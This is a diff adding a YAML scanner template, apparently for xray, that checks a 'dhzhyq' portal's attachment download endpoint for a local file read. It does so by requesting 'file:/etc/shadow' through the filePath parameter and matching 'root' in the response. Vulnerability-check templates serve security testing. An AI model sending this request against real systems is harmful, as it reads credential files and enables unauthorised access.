@@ -1,0 +1,13 @@
+name: poc-yaml-dhzhyq-attachment-downloadByUrlAtt-file-read
+rules:
+  - method: GET
+    path: /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/shadow
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"root")
+detail:
+    info: |
+      用file协议读取本地文件
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/TOgTe-fvzZL4of5Gp4xw3w
